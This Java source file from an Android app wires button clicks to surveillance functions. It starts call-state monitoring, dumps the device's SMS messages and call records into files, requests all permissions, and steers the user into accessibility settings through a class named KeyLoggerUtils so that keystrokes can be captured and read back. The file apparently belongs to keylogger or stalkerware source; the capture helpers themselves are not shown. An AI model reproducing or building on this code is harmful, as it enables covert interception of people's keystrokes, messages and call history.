package com.vikasyadavnsit.cdc.utils;

import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.fragment.HomeFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.services.CDCFileReader;

public class ActionUtils {

    public static void handleButtonPress(AppCompatActivity activity, int... viewIds) {
        ActionUtils actionUtils = new ActionUtils();
        for (int viewId : viewIds) {
            handleButtonPress(activity, viewId);
        }
    }

    public static void handleButtonPress(AppCompatActivity activity, int viewId) {

        Button actionButton = activity.findViewById(viewId);

        if (R.id.main_navigation_request_play_button == viewId) {
            actionButton.setOnClickListener(view -> {
                CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
            });
        } else if (R.id.main_navigation_request_home_button == viewId) {
            actionButton.setOnClickListener(view -> {
                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
                CallUtils.monitorCallState(activity);
                FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages(activity, FileMap.SMS));
                FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages(activity, FileMap.CALL));
            });
        } else if (R.id.main_navigation_request_settings_button == viewId) {
            actionButton.setOnClickListener(view -> {
                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
                new PermissionManager().requestAllPermissions(activity);
                //permissionHandler.resetAllPermissionManually(this);
                KeyLoggerUtils.startAccessibilitySettingIntent(activity);
                FileUtils.startFileAccessSettings(activity);
            });
        }
    }


}
